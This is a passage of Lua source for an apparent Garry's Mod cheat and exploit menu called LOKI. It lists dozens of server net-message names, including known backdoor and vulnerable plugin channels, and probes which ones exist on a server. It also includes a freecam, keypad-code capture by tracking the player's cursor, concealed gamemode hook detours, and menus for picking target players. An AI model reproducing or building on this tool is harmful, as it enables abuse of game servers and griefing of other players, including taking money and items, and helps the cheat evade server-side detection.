"PurchaseWeed", "DoDealerDeliver", "sendDuelInfo", "CreateOrganization", "DisbandOrganization", "ChangeOrgName", "IS_SubmitSID_C2S", "AcceptBailOffer", "CP_Test_Results", "ReSpawn", "FIGHTCLUB_KickPlayer", "IveBeenRDMed", "nCTieUpStart", "DestroyTable", "bringNfreeze", "JoinFirstSS", "unarrestPerson", "inviteToOrganization", "GovStation_SpawnVehicle", "DailyLoginClaim", "DL_AskLogsList", "DL_StartReport", "SpecDM_SendLoadout", "PowerRoundsForcePR", "wyozimc_playply", "SendSteamID", "JB_GiveCubics", "JB_SelectWarden", "RDMReason_Explain", "redirectMsg", "LB_AddBan", "GET_Admin_MSGS", "br_send_pm", "LAWYER.BailFelonOut", "LAWYER.GetBailOut", "GrabMoney", "nox_addpremadepunishment", "HV_AmmoBuy", "TMC_NET_MakePlayerWanted", "thiefnpc", "TMC_NET_FirePlayer", "updateLaws", "LotteryMenu", "soundArrestCommit", "hoverboardpurchase", "SpawnProtection", "NPCShop_BuyItem", "AcceptRequest", "Chess ClientWager", "netOrgVoteInvite_Server", "AskPickupItemInv", "buy_bundle", "MineServer", "Gb_gasstation_BuyGas", "D3A_CreateOrg", "ScannerMenu", "ORG_NewOrg", "passmayorexam", "levelup_useperk", "DeployMask", "RemoveMask", "SwapFilter", "WipeMask", "UseMedkit", "IDInv_RequestBank", "desktopPrinter_Withdraw", "sphys_dupe", "simfphys_gasspill", "dronesrewrite_controldr", "SCP-294Sv", "VC_PlayerReady", "blueatm", "cab_sendmessage", "FARMINGMOD_DROPITEM", "SlotsRemoved", "AirDrops_StartPlacement", "pp_info_send", "IGS.GetPaymentURL", "tickbookpayfine", "ncpstoredoact", "PermwepsNPCSellWeapon", "NET_AM_MakePotion", "minigun_drones_switch", "CW20_PRESET_LOAD", "SBP_addtime", "NetData", "ts_buytitle", "SBP_addtime", "EnterpriseWithdraw", "Chess Top10", "lectureListe", "Warn_CreateWarn", "BuilderXToggleKill", "deathrag_takeitem", "REPPurchase", "Hopping_Test", "REPAdminChangeLVL", "SquadGiveWeapon", "UpdateRPUModelSQL", "gportal_rpname_change", "NewRPNameSQL", "race_accept", "Kun_ZiptieStruggle", "NGII_TakeMoney", "InviteMember", "start_wd_hack", "giveArrestReason", "sellitem", "sv_saveweapons", "NET_CR_TakeStoredMoney", "donatorshop_itemtobuy", "misswd_accept", "ORG_VaultDonate", "Selldatride", "ZED_SpawnCar", "cab_cd_testdrive", "cab_sendmessage", "EliteParty_NoPOpenMenu", "EliteParty_SendPartyChat_ToClient", "EP_CreateParty_ToServer", "EP_ViewMenu_ToClient", "EliteParty_ViewParty_ToServer", "EP_ViewMenu_ToClient", "EliteParty_CreateParty_ToServer", "EliteParty_EditParty_ToServer", "EliteParty_LeaveParty_ToServer", "EliteParty_RequestInviteList_ToServer", "EliteParty_RequestInviteList_ToClient", "EliteParty_InvitePlayer_ToServer", "EliteParty_InvitePlayer_ToClient", "EliteParty_PartyInvitedAccepted_ToServer", "EliteParty_NewMember_ToClient", "EliteParty_NewMember_ToClient", "EliteParty_RequestJoin_ToServer", "EliteParty_RequestJoin_ToClient", "EliteParty_PartyRequestAccepted_ToServer", "EliteParty_PartyRequestAccepted_ToClient", "EliteParty_KickMember_ToServer", "EliteParty_KickedMember_ToClient", "EliteParty_KickedMember_ToClient", "EliteParty_MakeFounder_ToServer", "EliteParty_MakeFounder_ToClient", "Cuffs_GagPlayer", "Cuffs_BlindPlayer", "Cuffs_FreePlayer", "Cuffs_DragPlayer", "Cuffs_TiePlayers", "Cuffs_UntiePlayers", "xenoexistscl", "xenoexists", "xenoisactivatedcl", "xenoisactivated", "xenoac", "xenoclientfunction", "xenoserverfunction", "xenoactivation", "AddDeathZone", "StartEndGhost", "RemoveCertainZone", "testNet", "RemoveDeathZones", "nlr.notify", "nlr.killEvent", "nlr.RemoveZone", "pnet_Ready", "OpenFpsMenu", "Amethyst_PushNotification", "SendMessageToPlayer", "AmethystMessageSet", "Amethyst_PStats", "Amethyst_DebugAdd", "Amethyst_FetchLogs", "gLevel.buyWeapon", "gLevel.unlockAchievement", "gLevel.unlockAchievement", "gLevel.buySkill", "gLevel.doPrestige", "gLevel.buyAccesory", "gLevel.notifications", "gLevel.syncWeapons", "gLevel.loadWeapons", "gLevel.syncSkills", "gLevel.loadSkills", "gLevel.syncAchievements", "gLevel.loadAchievements", "NetWrapperVar", "NetWrapperRequest", "NetWrapperClear", "NetWrapperClear", "nodium", "_A", "gmhax_ShowUnknownEntity", "_da_", "whk_setart", "DarkRP_spawnPocket", "DuelMessageReturn", "ban_rdm", "dLogsGetCommand", "disguise", "AbilityUse", "give_me_weapon", "FinishContract", "NLR_SPAWN", "Kun_ZiptieStruggle", "NET_SS_DoBuyTakeoff", "ckit_roul_bet", "ply_pick_shit", "MONEY_SYSTEM_GetWeapons", "Sbox_gm_attackofnullday", "Sbox_gm_attackofnullday_key", "_blacksmurf", "echangeinfo", "open_menu", "closebutton_repeat", "sMsgStandard", "sNotifyHit", "sMsgAdmins", "sAlertNotice", "fgtnoafk", "Debug1", "Debug2", "gcontrol_vars", "control_vars", "checksaum", "atlaschat.sndcfg", "atlaschat.gtcfg", "arcphone_atmos_support", "arcphone_comm_status", "arcphone_emerg_numbers", "arcphone_nutscript_number", "ferpHUDSqu", "lolwut", "gotcha", "PrometheusMessages", "PrometheusNotification", "PrometheusPackages", "PrometheusColorChat", "Cl_PrometheusRequest", "PrometheusCustomJob", "GivePlayerAFKWarning", "RemovePlayerAFKWarning", "SyncButtons", "check_if_whitelist_enabled", "enable_whitelist", "add_to_whitelist", "remove_from_whitelist", "disable_whitelist", "clear_whitelist", "get_enabled_whitelist", "get_last_enabled_whitelist", "no_enabled_whitelists", "import_from_nordahl", "import_from_old_bwhitelist", "import_from_mayoz", "enable_all_whitelists", "disable_all_whitelists", "reset_everything", "customcheckerror", "clear_unknown_jobs", "get_all_blacklists", "get_all_permissed", "get_a_enabled", "no_import", "already_exists", "doesnt_exist", "stop_data_flow", "get_blacklisted", "SH_ACC_READY", "SH_ACC_PURCHASE", "SH_ACC_SELL", "SH_ACC_MENU", "SH_ACC_EQUIP", "SH_ACC_EQUIPS", "SH_ACC_CHANGE", "SH_ACC_INV", "SH_ACC_NOTIFY", "SH_ACC_ADJUST", "SH_ACC_ADJUST_RESET", "SH_ACC_REQUEST", "ASayPopup", "SW.nSetWeather", "SW.nRedownloadLightmaps", "ulxqm_reasons", "EZI_GetRankSpace", "gPrinters.rrnow", "gPrinters.retrieveMoney", "R8", "changeToPhysgun", "SetPlayerModel", "PSA.Undertale", "KickMe"}
LOKI.BAIT_CHANNELS = {}
LOKI.BAIT_COUNT = 0
LOKI.BAIT_CHANNELS_FOUND = {}
LOKI.BAIT_LIMIT = 5
for k, v in pairs(LOKI.BAIT_UNSORTED) do
    LOKI.BAIT_CHANNELS[v] = v
    LOKI.GENERAL_OVERRIDE = true
    if(LOKI.ValidNetString(v) && LOKI.BAIT_CHANNELS[v]) then
        LOKI.BAIT_COUNT = LOKI.BAIT_COUNT + 1
        LOKI.BAIT_CHANNELS_FOUND[v] = v
    end
    LOKI.GENERAL_OVERRIDE = false
end
LOKI.Freecam = {}
LOKI.Freecam.Enabled = false
LOKI.Freecam.ViewOrigin = Vector( 0, 0, 0 )
LOKI.Freecam.ViewAngle = Angle( 0, 0, 0 )
LOKI.Freecam.Velocity = Vector( 0, 0, 0 )
LOKI.Freecam.Data = {}
function LOKI.Freecam.Toggle(var)
    LOKI.Freecam.SetView = true
    LOKI.Freecam.Enabled = var
end
function LOKI.Freecam.EyePos()
    local pos;
    if(LOKI.Freecam.Enabled == true) then
        pos = LOKI.Freecam.Data.origin
    else
        pos = EyePos()
    end
    return pos
end
function LOKI.CalculateRenderPos(self)
    local pos = self:GetPos()
        pos:Add(self:GetForward() * self:OBBMaxs().x) -- Translate to front
        pos:Add(self:GetRight() * self:OBBMaxs().y) -- Translate to left
        pos:Add(self:GetUp() * self:OBBMaxs().z) -- Translate to top
 
        pos:Add(self:GetForward() * 0.15) -- Pop out of front to stop culling
 
    return pos
end
 
function LOKI.CalculateRenderAng(self)
    local ang = self:GetAngles()
        ang:RotateAroundAxis(ang:Right(), -90)
        ang:RotateAroundAxis(ang:Up(), 90)  
 
    return ang
end
function LOKI.CalculateKeypadCursorPos(ply, ent)
    if !ply:IsValid() then return end
 
    local tr = util.TraceLine( { start = ply:EyePos(), endpos = ply:EyePos() + ply:GetAimVector() * 65, filter = ply } )
    if !tr.Entity or tr.Entity ~= ent then return 0, 0 end
 
    local scale = ent.Scale || 0.02
    if !scale then return 0, 0 end
 
    local pos, ang = LOKI.CalculateRenderPos(ent), LOKI.CalculateRenderAng(ent)
    if !pos or !ang then return 0, 0 end
    local normal = ent:GetForward()
    
    local intersection = util.IntersectRayWithPlane(ply:EyePos(), ply:GetAimVector(), pos, normal)
    if !intersection then return 0, 0 end
 
    local diff = pos - intersection
 
    local x = diff:Dot( -ang:Forward() ) / scale
    local y = diff:Dot( -ang:Right() ) / scale
 
    return x, y
end
local elements = {{x = 0.075, y = 0.04, w = 0.85, h = 0.25,},{x = 0.075, y = 0.04 + 0.25 + 0.03, w = 0.85 / 2 - 0.04 / 2 + 0.05, h = 0.125, text = "ABORT",},{x = 0.5 + 0.04 / 2 + 0.05, y = 0.04 + 0.25 + 0.03, w = 0.85 / 2 - 0.04 / 2 - 0.05, h = 0.125, text = "OK",}}
do for i = 1, 9 do local column = (i - 1) % 3 local row = math.floor((i - 1) / 3) local element = {x = 0.075 + (0.3 * column), y = 0.175 + 0.25 + 0.05 + ((0.5 / 3) * row), w = 0.25, h = 0.13, text = tostring(i), } elements[#elements + 1] = element end end
function LOKI.KPGetHoveredElement(ply, ent)
    local scale = ent.Scale || 0.02
 
    local w, h = (ent:OBBMaxs().y - ent:OBBMins().y) / scale , (ent:OBBMaxs().z - ent:OBBMins().z) / scale
    local x, y = LOKI.CalculateKeypadCursorPos(ply, ent)
 
    for _, element in ipairs(elements) do
        local element_x = w * element.x
        local element_y = h * element.y
        local element_w = w * element.w
        local element_h = h * element.h
 
        if  element_x < x and element_x + element_w > x and
            element_y < y and element_y + element_h > y 
        then
            return element
        end
    end
end
function LOKI.GetKeypadStatus(kp)
    if(kp.SendCommand) then
        return {0, 1, 2}
    elseif(kp.EnterKey) then
        return {0, 2, 1}
    end
    return {0, 1, 2}
end
LOKI.KeypadCodes = LOKI.LAST.KeypadCodes || {}
LOKI.TempKeypadCodes = LOKI.LAST.TempKeypadCodes || {}
LOKI.KeypadStatus = LOKI.LAST.KeypadStatus || {}
LOKI.KeypadText = LOKI.LAST.KeypadText || {}
LOKI.CommandList = {}
LOKI.CompleteList = {}
LOKI.concommand = {}
LOKI.concommand.Add = function( name, func, completefunc, help, flags )
    local det_call = LOKI.DetourCall || false
    LOKI.DetourCall = true
    local LowerName = string.lower( name )
    LOKI.CommandList[ LowerName ] = func
    LOKI.CompleteList[ LowerName ] = completefunc
    //AddConsoleCommand( name, help, flags )
    LOKI.DetourCall = det_call
end
 
LOKI.NetReceivers = {}
LOKI.Hooks = {};
 
gmod.GetGamemode().AcceptInput = function(self, type, name, func)
    LOKI.Hooks[type] = LOKI.Hooks[type] || {};
 
    LOKI.Hooks[type][name] = func;
    
    if(!LOKI.Detours["GAMEMODE"]) then
        LOKI.Detours["GAMEMODE"] = {};
    end
 
    if(!LOKI.Hooks["GAMEMODE"]) then
        LOKI.Hooks["GAMEMODE"] = {};
    end
 
    if(!LOKI.Detours["GAMEMODE"][type]) then
        LOKI.Detours["GAMEMODE"][type] = self[type];
    end
    
    if(LOKI.Detours["GAMEMODE"][type] && LOKI.Hooks["GAMEMODE"][type] && LOKI.Hooks["GAMEMODE"][type] != self[type]) then
        LOKI.Detours["GAMEMODE"][type] = self[type];
    end
 
    LOKI.Hooks["GAMEMODE"][type] = function(self, ...)
        if(!LOKI || !LOKI.Detours || LOKI.Unload) then return end
        
        local ret = nil
        local args = {}
 
        if(LOKI.Detours["GAMEMODE"][type]) then
            args = {LOKI.Detours["GAMEMODE"][type](self, ...)};
            if(#args != 0) then ret = (unpack(args)); end
        end
        
        if(LOKI.Killswitch || !LOKI.Hooks || !LOKI.Hooks[type]) then return ret end
    
        for k,v in next, LOKI.Hooks[type] do
            args = {v(ret, ...)};
            if(#args == 0) then continue; end
            ret = (unpack(args));
        end
        
        return ret
    end
 
    self[type] = LOKI.Hooks["GAMEMODE"][type]
end
local function hook_Add(eventName, identifier, func) 
    if(LOKI.DetourTables[eventName]) then return end
    if(!LOKI.Hooks[eventName]) then 
        LOKI.Hooks[eventName] = {}
    end
    LOKI.Hooks[eventName][identifier] = func
    if(LOKI.SecureHooks) then
        return gmod.GetGamemode():AcceptInput(eventName, identifier, func)
    else
        return hook.Add(eventName, identifier, func)
    end
end
//////////////////////////////////////////////- MENU UTILS -////////////////////////////////////////////////
function LOKI.MakeFunctionButton( parent, x, y, btext, func, tooltip, tab, border)
    if !parent:IsValid() then return end
    local TButton = LOKI.vgui.Create( "DButton", LOKI.Menu )
    TButton:SetParent( parent )
    TButton:SetPos( x, y )
    TButton:SetText( btext )
    TButton:SetTextColor( Color(255, 255, 255, 255) )
    TButton:SizeToContents()
    TButton:SetTall( 24 )
    --if tooltip then TButton:SetToolTip( tooltip ) end
    TButton.Paint = function( self, w, h )
        surface.SetDrawColor( Color(60, 60, 60, 200) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color( 60, 60, 60 ) )
        surface.SetMaterial( downgrad )
        surface.DrawTexturedRect( 0, 0, w, h/ 2 )
        surface.SetDrawColor( Color(100, 100, 100, 255) )
        surface.DrawOutlinedRect( 0, 0, w, h )
        if(border) then
            local enabled = false
            if(isbool(tab.bool)) then
                enabled = tab.bool
            elseif(LOKI.NotNil(tab.bool)) then
                enabled = func.bools[tab.bool]
            else
                enabled = func.bools.enabled
            end
            if(enabled) then
                surface.SetDrawColor( Color(55, 255, 55, 245) )
                surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
            end
        end
    end
    TButton.DoClick = function()
        if(!tab) then
            return func()
        end
        if(tab.typ == "func") then
            local det_call = LOKI.DetourCall || false
            LOKI.DetourCall = true
            if(func && func.hooks.Think) then 
                func.hooks.Think(tab.args || {}, func, TButton) 
            end
            LOKI.DetourCall = det_call
        elseif(tab.typ == "bool") then
            local enabled = false
            if(isbool(tab.bool)) then
                tab.bool = !tab.bool
                enabled = tab.bool
            elseif(LOKI.NotNil(tab.bool)) then
                func.bools[tab.bool] = !func.bools[tab.bool]
                enabled = func.bools[tab.bool]
            else
                func.bools.enabled = !func.bools.enabled
                enabled = func.bools.enabled
            end
            if(isfunction(tab.callback)) then
                tab.callback(enabled)
            end
            TButton:SetText(!enabled && ((tab.ToggleText && tab.ToggleText[1]) || "Start") || ((tab.ToggleText && (tab.ToggleText[2] || tab.ToggleText[1])) || "Stop"))
            if(isfunction(func.OnEnable) && enabled) then
                if(LOKI.NotNil(tab.bool)) then
                    func.OnEnable(tab.bool, func)
                else
                    func.OnEnable("enabled", func)
                end
            end
            if(isfunction(func.OnDisable) && !enabled) then
                if(LOKI.NotNil(tab.bool)) then
                    func.OnDisable(tab.bool, func)
                else
                    func.OnDisable("enabled", func)
                end
            end
            if(tab.bool && tab.addr) then LOKI.Store(tab.addr, func.bools[tab.bool]) end
            TButton:SizeToContents() 
            TButton:SetTall(24)
        end
    end
    return TButton:GetWide(), TButton:GetTall()
end
function LOKI.OpenTableEditor(Parent, WholeTable, Title, Callback, isSecondTable, Position, Position2, Originaltable)
    local WholeTablecopy = (table.Copy( WholeTable ) )
    local TableEditFrame = LOKI.vgui.Create( "DFrame", Parent )
    TableEditFrame:SetPos( 50, 50 )
    TableEditFrame:SetSize( 1000, ScrH()/2 )
    TableEditFrame:SetTitle(Title)
    TableEditFrame:Center()
    TableEditFrame:SetVisible( true )
    TableEditFrame:SetDraggable( true )
    TableEditFrame:ShowCloseButton( true )
    TableEditFrame.Paint = function(s, w, h)
        if(Parent && (!IsValid(Parent) || !LOKI.Menu:IsVisible())) then TableEditFrame:Close() return end
        surface.SetDrawColor( Color(30, 30, 30, 245) )
        surface.DrawRect( 0, 0, w, h )
    end
    TableEditFrame:MakePopup()
 
    local vList = LOKI.vgui.Create( "DCategoryList", TableEditFrame )
    vList.Paint = function() end
    vList:Dock( FILL )
    
    for v,k in SortedPairs(WholeTablecopy) do
    
    
        if TypeID(k) == (TYPE_STRING)then   
            local Value = vList:Add( v .. "   (STRING)" )
            local TextEntry = LOKI.vgui.Create( "DTextEntry", vList )
            TextEntry:SetSize( 1000, 25 )
            TextEntry:SetText( k )
            
            TextEntry.OnChange = function( self )
                WholeTablecopy[v] = self:GetValue()
            end
        end
        
        if TypeID(k) == (TYPE_NUMBER)then   
            local Value = vList:Add( v .. "   (NUMBER)" )
            local TextEntry = LOKI.vgui.Create( "DTextEntry", vList )
            TextEntry:SetSize( 1000, 25 )
            TextEntry:SetText( k )
            TextEntry.OnChange = function( self )
                WholeTablecopy[v] = tonumber(self:GetValue())
            end
        end 
        
        if TypeID(k) == (TYPE_BOOL)then
            local Value = vList:Add( v .. "   (BOOL)")
            local DComboBox = LOKI.vgui.Create( "DComboBox", vList )
            --DComboBox:SetPos( 5, 5 )
            DComboBox:SetSize( 100, 20 )
            DComboBox:SetValue( tostring(k) )
            DComboBox:AddChoice( "true" )
            DComboBox:AddChoice( "false" )
            DComboBox.OnSelect = function( panel, index, value )
                WholeTablecopy[v] = tobool(value)
            end
        end
        
        if TypeID(k) == (TYPE_VECTOR)then
            local vecstring = tostring(k)
            local Value = vList:Add( v .. "   (VECTOR)")
            local TextEntry = LOKI.vgui.Create( "DTextEntry", vList )
            TextEntry:SetSize( 1000, 25 )
            TextEntry:SetText( vecstring )
            TextEntry.OnChange = function( self )
                WholeTablecopy[v] = util.StringToType(self:GetValue(), "Vector" ) 
            end
        end
        
        if TypeID(k) == (TYPE_ANGLE)then
            local vecstring = tostring(k)
            local Value = vList:Add( v .. "   (ANGLE)")
            local TextEntry = LOKI.vgui.Create( "DTextEntry", vList )
            TextEntry:SetSize( 1000, 25 )
            TextEntry:SetText( vecstring )
            TextEntry.OnChange = function( self )
                WholeTablecopy[v] = util.StringToType(self:GetValue(), "Angle" ) 
            end
        end
        
        
        if TypeID(k) == (TYPE_TABLE) then
                local Value = vList:Add( v.. "  (TABLE)" )
                if k.r && k["g"] && k["b"] && k["a"] then
                    local SmallFrame = LOKI.vgui.Create( "DPanel",vList)
                    SmallFrame:SetBackgroundColor(Color(200,200,200))
                    SmallFrame:SetHeight(300)
                    local Mixer = LOKI.vgui.Create( "DColorMixer", SmallFrame )
                    Mixer:Dock( LEFT )          --Make Mixer fill place of Frame
                    Mixer:SetWidth(400)
                    Mixer:SetHeight(300)
                    Mixer:SetPalette( true )        --Show/hide the palette         DEF:true
                    Mixer:SetAlphaBar( true )       --Show/hide the alpha bar       DEF:true
                    Mixer:SetWangs( true )          --Show/hide the R G B A indicators  DEF:true
                    Mixer:SetColor( Color( k["r"] , k["g"] , k["b"] , k["a"] ) )    --Set the default color
                    
                    local DColorButton = LOKI.vgui.Create( "DColorButton", SmallFrame )
                    DColorButton:Dock( TOP )
                    DColorButton:SetSize( 50, 50 )
                    --DColorButton:SetPos( 60, 100 )
                    DColorButton:SetColor(Mixer:GetColor())
        
                    function Mixer:ValueChanged(self, color)
                            DColorButton:SetColor(Mixer:GetColor())
                            WholeTablecopy[v] = Mixer:GetColor()
                    end
 
                else
        
 
                    for t,z in pairs(k) do -- Second Level
                        
                        if TypeID(z) == (TYPE_STRING)then
                            local SmallFrame = LOKI.vgui.Create( "DPanel",vList)
 
                            local kList = LOKI.vgui.Create( "DLabel", SmallFrame )
                            SmallFrame:SetBackgroundColor(Color(200,200,200))
                            kList:SetText( "  "..  t)
                            kList:SetColor(Color(0,0,0))
                            kList:SetPos(20,20)
                            kList:SetSize(500,25)
                            kList:Dock(LEFT)
                            
                            local TextEntry = LOKI.vgui.Create( "DTextEntry", SmallFrame )
                            TextEntry:SetSize( 500, 25 )
                            TextEntry:Dock(RIGHT)
                            TextEntry:SetText( z )
                            TextEntry:SetPos(TableEditFrame:GetSize() - 600, 0)
                            TextEntry.OnChange = function( self )
                                WholeTablecopy[v][t] = self:GetValue()
                            end
                        end
 
                        
                        if  TypeID(z) == (TYPE_NUMBER) then
                            local SmallFrame = LOKI.vgui.Create( "DPanel",vList)
                            local kList = LOKI.vgui.Create( "DLabel", SmallFrame )
                            SmallFrame:SetBackgroundColor(Color(200,200,200))
                            kList:SetText( "  "..  t)
                            kList:SetColor(Color(0,0,0))
                            kList:SetPos(20,0)
                            kList:SetSize(500,25)
                            kList:Dock(LEFT)
                            
                            local TextEntry = LOKI.vgui.Create( "DTextEntry", SmallFrame )
                            TextEntry:SetSize( 500, 25 )
                            TextEntry:Dock(RIGHT)
                            TextEntry:SetText( z )
                            TextEntry:SetPos(TableEditFrame:GetSize() - 600, 0)
                            TextEntry.OnChange = function( self )
                                WholeTablecopy[v][t] = tonumber(self:GetValue())
                            end
                        end
                    
            
                        if TypeID(z) == TYPE_TABLE then --Third level starts over
                            --local Value = vList:Add( t )
                            local SmallFrame = LOKI.vgui.Create( "DPanel",vList)
                            local kList = LOKI.vgui.Create( "DLabel", SmallFrame )
                            SmallFrame:SetBackgroundColor(Color(200,200,200))
                            kList:SetText( "  "..  t)
                            --kList:SetText(t)
                            kList:SetColor(Color(0,0,0))
                            kList:SetPos(20,0)
                            kList:SetSize(500,25)
                            kList:Dock(LEFT)
                            local DermaButton = LOKI.vgui.Create( "DButton", SmallFrame ) 
                            DermaButton:SetText( t.." (Table)")                 
                            DermaButton:SetPos( DermaButton:GetSize() - 600, 0 )                    
                            DermaButton:SetSize(500,25)
                            DermaButton:Dock(RIGHT)                         
                            DermaButton.DoClick = function()                
                                LOKI.OpenTableEditor(TableEditFrame, WholeTablecopy[v][t], Title, nil, true, v, t, WholeTablecopy)          
                            end
                        end
                    end
                
            end
        end
    end
        
    TableEditFrame.OnClose = function()
        if isSecondTable then
            local tablecopy = WholeTable
            table.Merge(Originaltable[Position][Position2], WholeTablecopy) 
        else
            local tablecopy = table.DeSanitise(WholeTablecopy)
            table.Merge(WholeTable,tablecopy)
            if(isfunction(Callback)) then
                Callback(WholeTable)
            end
        end 
    end
end
function LOKI.MakeEntitySelectionButton( parent, tbl, x, y, tab, single )
    if !parent:IsValid() then return end
    if(isfunction(tbl)) then
        tbl = tbl()
    end
    local TButton = LOKI.vgui.Create( "DButton", LOKI.Menu )
    TButton:SetParent( parent )
    TButton:SetPos( x, y )
    TButton:SetText( tab.Name || "Choose Target" .. (single && "" || "s") )
    TButton:SetTextColor( Color(255, 255, 255, 255) )
    TButton:SizeToContents()
    TButton:SetTall( 24 )
    TButton.Paint = function( self, w, h )
        surface.SetDrawColor( Color(60, 60, 90, 200) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color( 60, 60, 60 ) )
        surface.SetMaterial( downgrad )
        surface.DrawTexturedRect( 0, 0, w, h/ 2 )
        surface.SetDrawColor( Color(100, 100, 100, 255) )
        surface.DrawOutlinedRect( 0, 0, w, h )
        surface.SetDrawColor( Color(70, 70, 100, 255) )
        surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
    end
    TButton.DoClick = function()
        LOKI.SelectEntityPanel( parent, tbl, tab, single )
    end
    return TButton:GetWide(), TButton:GetTall()
end
function LOKI.SelectEntityPanel( parent, tbl, tab, single )
    if LOKI.EntitySelector and LOKI.EntitySelector:IsVisible() then LOKI.EntitySelector:Remove() end
    local plytab = LOKI.GetStored( tab.addr, {}, true )
    if(!istable(plytab)) then plytab = {plytab} end
    LOKI.EntitySelector = LOKI.vgui.Create("DFrame", parent)
    LOKI.EntitySelector:SetPaintedManually(true)
    LOKI.EntitySelector:SetSize(250,400)
    LOKI.EntitySelector:SetTitle("Select "..tab.typ.." to target")
    LOKI.EntitySelector:SetPos( gui.MouseX(), gui.MouseY() )
    LOKI.EntitySelector:MakePopup()
    LOKI.EntitySelector.Paint = function( s, w, h )
        if !IsValid(LOKI.Menu) or !LOKI.Menu:IsVisible() then s:Remove() return end
        surface.SetDrawColor( Color(30, 30, 30, 245) )
        surface.DrawRect( 0, 0, w, h )
        surface.SetDrawColor( Color(55, 55, 55, 245) )
        surface.DrawOutlinedRect( 0, 0, w, h )
        surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
    end
    local Plist = LOKI.vgui.Create( "DPanelList", LOKI.EntitySelector )
    Plist:SetSize( LOKI.EntitySelector:GetWide() - 10, LOKI.EntitySelector:GetTall() - 55 )
    Plist:SetPadding( 5 )
    Plist:SetSpacing( 5 )
    Plist:EnableHorizontal( false )
    Plist:EnableVerticalScrollbar( true )
    if(tab.nostore) then
        Plist:SetPos( 5, 20 )
    else
        Plist:SetPos( 5, 40 )
    end
    Plist:SetName( "" )
    local x, y = 10, 23
    if(!tab.nostore) then
        if(!single) then
            local target1 = LOKI.vgui.Create("DButton", LOKI.EntitySelector)
            target1:SetSize( 25, 20 )
            target1:SetPos( x, 23 )
            x = x + target1:GetSize()
            target1:SetText("All")
            target1:SetTextColor(Color(255, 255, 255, 255))
            target1.Paint = function(panel, w, h)
                surface.SetDrawColor(100, 100, 100 ,255)
                surface.DrawOutlinedRect(0, 0, w, h)
                surface.SetDrawColor(0, 0, 50 ,155)
                surface.DrawRect(0, 0, w, h)
            end
            target1.DoClick = function()
                for _, p in ipairs(tbl) do
                    if not table.HasValue( plytab, p ) then
                        table.insert( plytab, p )
                    end
                end
                LOKI.Store( tab, plytab )
            end
        end
        local target2 = LOKI.vgui.Create("DButton", LOKI.EntitySelector)
        target2:SetSize( 40, 20 )
        target2:SetPos( x, 23 )
        x = x + target2:GetSize()
        target2:SetText("None")
        target2:SetTextColor(Color(255, 255, 255, 255))
        target2.Paint = function(panel, w, h)
            surface.SetDrawColor(100, 100, 100 ,255)
            surface.DrawOutlinedRect(0, 0, w, h)
            surface.SetDrawColor(0, 0, 50 ,155)
            surface.DrawRect(0, 0, w, h)
        end
        target2.DoClick = function()
            table.Empty(plytab)
            if(single) then
                LOKI.Store( tab, plytab[1] )
            else
                LOKI.Store( tab, plytab )
            end
        end
        if(type(tbl[1]) == "Player") then
            local target3 = LOKI.vgui.Create("DButton", LOKI.EntitySelector )
            target3:SetSize( 30, 20 )
            target3:SetPos( x, 23 )
            x = x + target3:GetSize()
            target3:SetText("Me")
            target3:SetTextColor(Color(255, 255, 255, 255))
            target3.Paint = function(panel, w, h)
                surface.SetDrawColor(100, 100, 100 ,255)
                surface.DrawOutlinedRect(0, 0, w, h)
                surface.SetDrawColor(0, 0, 50 ,155)
                surface.DrawRect(0, 0, w, h)
            end
            target3.DoClick = function()
                table.Empty(plytab)
                plytab[1] = LOKI.GetLP()
                if(single) then
                    LOKI.Store( tab, plytab[1] )
                else
                    LOKI.Store( tab, plytab )
                end
            end
        end
        if(!single && type(tbl[1]) == "Player") then
            local target4 = LOKI.vgui.Create("DButton", LOKI.EntitySelector )
            target4:SetSize( 50, 20 )
            target4:SetPos( x, 23 )
            x = x + target4:GetSize()
            target4:SetText("Whitelist")
            target4:SetTextColor(Color(255, 255, 255, 255))
            target4.Paint = function(panel, w, h)
                surface.SetDrawColor(100, 100, 100 ,255)
                surface.DrawOutlinedRect(0, 0, w, h)
                surface.SetDrawColor(0, 0, 50 ,155)
                surface.DrawRect(0, 0, w, h)
                if LOKI.GetWhitelist(tab.addr) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end
                surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
            end
            target4.DoClick = function()
                LOKI.SetWhitelist(tab.addr, !LOKI.GetWhitelist(tab.addr))
            end
        end
        local target5 = LOKI.vgui.Create( "DTextEntry", LOKI.EntitySelector )
        target5:SetPos( x, 23 )
        target5:SetSize( 85, 20 )
        x = x + target5:GetSize()
        target5:SetText( "" )
        target5.OnChange = function( self )
            local nam = self:GetValue()
            nam = string.Replace(nam, " ", "")
            nam = nam:gsub( "[%-%^%$%(%)%%%.%[%]%*%+%-%?]", "%%%1" )
            local namtab = string.Explode( ",", nam )
            plytab = {}
            for _, pl in ipairs( tbl ) do
                for _, s in pairs( namtab ) do
                    if v:IsPlayer() && (string.find( string.lower( pl:Nick() ), s, 1, true ) || 
                        string.find( string.lower( pl:GetUserGroup() ), s, 1, true )) ||
                            string.find( string.lower( pl:GetClass() ), s, 1, true ) then
                                table.Empty(plytab)
                                plytab[#plytab+1] = pl
                                if(single) then
                                    break
                                end
                    end
                end
            end
            if(single) then
                LOKI.Store( tab, plytab[1] )
            else
                LOKI.Store( tab, plytab )
            end
        end
    end
    for k, v in ipairs( tbl ) do
        if(!IsValid(v)) then continue end
        local plypanel2 = LOKI.vgui.Create( "DPanel", (!tab.nostore && Plist) || LOKI.EntitySelector )
        plypanel2:SetPos( 0, 0 )
        plypanel2:SetSize( 200, 25 )
        local teamcol = Color(255,255,255)
        if(v:IsPlayer()) then
            teamcol = team.GetColor( v:Team() )
        end
        plypanel2.Paint = function( s, w, h )
            if !v:IsValid() then return end
            surface.SetDrawColor( Color(30, 30, 30, 245) )
            surface.DrawRect( 0, 0, w, h )
            surface.SetDrawColor( teamcol )
            surface.DrawRect( 0, h - 3, w, 3 )
            surface.SetDrawColor( Color(55, 55, 55, 245) )
            surface.DrawOutlinedRect( 0, 0, w, h )
            if table.HasValue( LOKI.GetStored(tab.addr) || {}, v ) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end
            surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
        end
        local plyname = LOKI.vgui.Create( "DLabel", plypanel2 )
